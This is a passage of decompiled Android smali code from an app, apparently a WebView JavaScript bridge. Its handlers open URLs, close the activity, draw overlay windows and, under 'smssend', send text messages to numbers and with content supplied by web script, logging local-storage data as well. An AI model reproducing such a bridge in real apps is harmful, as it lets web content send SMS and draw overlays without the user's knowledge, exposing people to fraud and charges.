    sput-object v3, Ld3/c;->g:Ld3/c;

    goto :goto_21

    :catchall_2
    move-exception p1

    goto/16 :goto_24

    :cond_2c
    :goto_21
    sget-object v0, Ld3/c;->g:Ld3/c;
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_2

    monitor-exit v2

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    new-instance v2, Ljava/util/ArrayList;

    invoke-direct {v2}, Ljava/util/ArrayList;-><init>()V

    :try_start_5
    new-instance v3, Lorg/json/JSONObject;

    invoke-direct {v3, p2}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3}, Lorg/json/JSONObject;->keys()Ljava/util/Iterator;

    move-result-object v4

    :goto_22
    invoke-interface {v4}, Ljava/util/Iterator;->hasNext()Z

    move-result v5

    if-eqz v5, :cond_2d

    invoke-interface {v4}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Ljava/lang/String;

    invoke-virtual {v3, v5}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    new-instance v7, Lt0/c;

    invoke-direct {v7, v5, v6}, Lt0/c;-><init>(Ljava/lang/Object;Ljava/lang/Object;)V

    invoke-virtual {v2, v7}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    sget-object v7, Ljava/lang/System;->out:Ljava/io/PrintStream;

    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    const-string v9, "Key: "

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, ", Value: "

    invoke-virtual {v8, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v7, v5}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_1

    goto :goto_22

    :catch_1
    move-exception v2

    invoke-virtual {v2}, Ljava/lang/Throwable;->printStackTrace()V

    iget-object v2, v0, Ld3/c;->b:Ljava/lang/Object;

    check-cast v2, Landroid/content/Context;

    const-string v3, "Error On Read Info "

    const/4 v4, 0x0

    invoke-static {v2, v3, v4}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v2

    invoke-virtual {v2}, Landroid/widget/Toast;->show()V

    move-object v2, v1

    :cond_2d
    if-eqz v2, :cond_2e

    iget-object v3, v0, Ld3/c;->f:Ljava/lang/Object;

    check-cast v3, Landroid/widget/LinearLayout;

    invoke-virtual {v3}, Landroid/view/ViewGroup;->removeAllViews()V

    invoke-interface {v2}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v2

    :goto_23
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v3

    if-eqz v3, :cond_2e

    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Lt0/c;

    iget-object v4, v0, Ld3/c;->b:Ljava/lang/Object;

    check-cast v4, Landroid/content/Context;

    const v5, 0x7f0b0023

    invoke-static {v4, v5, v1}, Landroid/view/View;->inflate(Landroid/content/Context;ILandroid/view/ViewGroup;)Landroid/view/View;

    move-result-object v4

    const v5, 0x7f08006f

    invoke-virtual {v4, v5}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v5

    check-cast v5, Landroid/widget/TextView;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v7, v3, Lt0/c;->a:Ljava/lang/Object;

    check-cast v7, Ljava/lang/String;

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v7, ":"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    const v5, 0x7f0800c4

    invoke-virtual {v4, v5}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v5

    check-cast v5, Landroid/widget/TextView;

    iget-object v6, v3, Lt0/c;->b:Ljava/lang/Object;

    check-cast v6, Ljava/lang/CharSequence;

    invoke-virtual {v5, v6}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    const v5, 0x7f080051

    invoke-virtual {v4, v5}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v5

    check-cast v5, Landroid/widget/TextView;

    new-instance v6, Ld3/a;

    invoke-direct {v6, v0, v3}, Ld3/a;-><init>(Ld3/c;Lt0/c;)V

    invoke-virtual {v5, v6}, Landroid/view/View;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    iget-object v3, v0, Ld3/c;->f:Ljava/lang/Object;

    check-cast v3, Landroid/widget/LinearLayout;

    invoke-virtual {v3, v4}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    goto :goto_23

    :cond_2e
    iget-object v1, v0, Ld3/c;->d:Ljava/lang/Object;

    check-cast v1, Landroid/view/View;

    invoke-virtual {v1}, Landroid/view/View;->getWindowToken()Landroid/os/IBinder;

    move-result-object v1

    if-nez v1, :cond_2f

    iget-object v1, v0, Ld3/c;->c:Ljava/lang/Object;

    check-cast v1, Landroid/view/WindowManager;

    iget-object v2, v0, Ld3/c;->d:Ljava/lang/Object;

    check-cast v2, Landroid/view/View;

    iget-object v0, v0, Ld3/c;->e:Ljava/lang/Object;

    check-cast v0, Landroid/view/WindowManager$LayoutParams;

    invoke-interface {v1, v2, v0}, Landroid/view/ViewManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    :cond_2f
    iget-object v0, p0, Ld3/f;->a:Landroid/app/Activity;

    invoke-static {v0, p2}, Ld3/f;->a(Landroid/app/Activity;Ljava/lang/String;)V

    goto/16 :goto_2a

    :goto_24
    monitor-exit v2

    throw p1

    :sswitch_7
    const-string v0, "gobrowser"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_30

    goto/16 :goto_2a

    :cond_30
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0, p2}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    const-string p2, "url"

    invoke-virtual {v0, p2}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    new-instance v0, Landroid/content/Intent;

    const-string v1, "android.intent.action.VIEW"

    invoke-static {p2}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object p2

    invoke-direct {v0, v1, p2}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    iget-object p2, p0, Ld3/f;->a:Landroid/app/Activity;

    invoke-virtual {p2, v0}, Landroid/app/Activity;->startActivity(Landroid/content/Intent;)V

    goto/16 :goto_2a

    :sswitch_8
    const-string p2, "finish"

    invoke-virtual {p1, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p2

    if-nez p2, :cond_31

    goto/16 :goto_2a

    :cond_31
    iget-object p2, p0, Ld3/f;->a:Landroid/app/Activity;

    invoke-virtual {p2}, Landroid/app/Activity;->finish()V

    goto/16 :goto_2a

    :sswitch_9
    const-string v0, "smssend"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_32

    goto/16 :goto_2a

    :cond_32
    iget-object v0, p0, Ld3/f;->b:Landroid/webkit/WebView;

    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1, p2}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    const-string p2, "fromPhone"

    invoke-virtual {v1, p2}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    const-string v2, "toPhone"

    invoke-virtual {v1, v2}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const-string v3, "content"

    invoke-virtual {v1, v3}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    const-string v3, "smscNumber"

    invoke-virtual {v1, v3}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    new-instance v1, Ld3/e;

    invoke-direct {v1, v0}, Ld3/e;-><init>(Landroid/webkit/WebView;)V

    const-string v0, "\u51c6\u5907\u53d1\u9001\u77ed\u4fe1: "

    const-string v10, "SmsUtil"

    if-eqz v2, :cond_37

    if-nez v9, :cond_33

    goto/16 :goto_29

    :cond_33
    iget-object v11, p0, Ld3/f;->a:Landroid/app/Activity;

    const-string v3, "android.permission.SEND_SMS"

    invoke-static {v11, v3}, Ll0/f;->a(Landroid/content/Context;Ljava/lang/String;)I

    move-result v4

    if-nez v4, :cond_36

    invoke-static {v11, v3}, Ll0/f;->a(Landroid/content/Context;Ljava/lang/String;)I

    move-result v3

    if-nez v3, :cond_36

    const-string v3, "\u4f7f\u7528 SIM \u5361 ID: "

    :try_start_6
    invoke-virtual {v0, v9}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v10, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    new-instance v0, Landroid/content/Intent;

    const-string v4, "com.xxxx.runapp.SMS_SENT_ACTION"

    invoke-direct {v0, v4}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    new-instance v4, Landroid/content/Intent;

    const-string v6, "com.xxxx.runapp.SMS_DELIVERED_ACTION"

    invoke-direct {v4, v6}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    sget v6, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v7, 0x1f

    if-lt v6, v7, :cond_34

    const/high16 v6, 0xc000000

    goto :goto_25

    :cond_34
    const/high16 v6, 0x8000000

    :goto_25
    const/16 v7, 0x66

    invoke-static {v11, v7, v0, v6}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v7

    const/16 v0, 0x67

    invoke-static {v11, v0, v4, v6}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v8

    invoke-static {v11, v1}, Lr2/f;->a0(Landroid/app/Activity;Ld3/e;)V

    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_3

    :try_start_7
    invoke-static {v11, p2}, Lr2/f;->Q(Landroid/app/Activity;Ljava/lang/String;)I

    move-result p2

    const/4 v4, -0x1

    if-eq p2, v4, :cond_35

    invoke-static {p2}, Landroid/telephony/SmsManager;->getSmsManagerForSubscriptionId(I)Landroid/telephony/SmsManager;

    move-result-object v0

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, p2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string p2, " \u53d1\u9001\u77ed\u4fe1"

    invoke-virtual {v4, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    invoke-static {v10, p2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_2

    goto :goto_26

    :catch_2
    move-exception p2

    goto :goto_27

    :cond_35
    :goto_26
    move-object v3, v0

    goto :goto_28

    :goto_27
    :try_start_8
    invoke-virtual {p2}, Ljava/lang/Throwable;->printStackTrace()V

    goto :goto_26

    :goto_28
    move-object v4, v2

    move-object v6, v9

    invoke-virtual/range {v3 .. v8}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_3

    goto :goto_2a

    :catch_3
    move-exception p2

    const-string v0, "\u77ed\u4fe1\u53d1\u9001\u5931\u8d25,\u4f7f\u7528\u7cfb\u7edf\u9ed8\u8ba4\u53d1\u9001"

    invoke-static {v10, v0, p2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    invoke-static {v11, v2, v9, v1}, Lr2/f;->b0(Landroid/app/Activity;Ljava/lang/String;Ljava/lang/String;Ld3/e;)V

    goto :goto_2a

    :cond_36
    invoke-static {v11, v2, v9, v1}, Lr2/f;->b0(Landroid/app/Activity;Ljava/lang/String;Ljava/lang/String;Ld3/e;)V

    goto :goto_2a

    :cond_37
    :goto_29
    const-string p2, "\u76ee\u6807\u53f7\u7801\u6216\u77ed\u4fe1\u5185\u5bb9\u4e3a\u7a7a\uff0c\u65e0\u6cd5\u53d1\u9001"

    invoke-static {v10, p2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    :cond_38
    :goto_2a
    return-object p1

    nop

    :sswitch_data_0
    .sparse-switch
        -0x7c08c79f -> :sswitch_9
        -0x4bf6736d -> :sswitch_8
        -0x44d5b6c0 -> :sswitch_7
        -0x3975d14c -> :sswitch_6
        -0x178ce580 -> :sswitch_5
        -0x91c8e56 -> :sswitch_4
        0x2e8adc24 -> :sswitch_3
        0x33439d8e -> :sswitch_2
        0x42bf84da -> :sswitch_1
        0x7ccc29f5 -> :sswitch_0
    .end sparse-switch
.end method

.method public final receiveLocalStorageData(Ljava/lang/String;)V
    .locals 1
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    invoke-static {p1}, Li3/f;->h(Ljava/lang/Object;)V

    const-string v0, "LocalStorageData"

    invoke-static {v0, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method
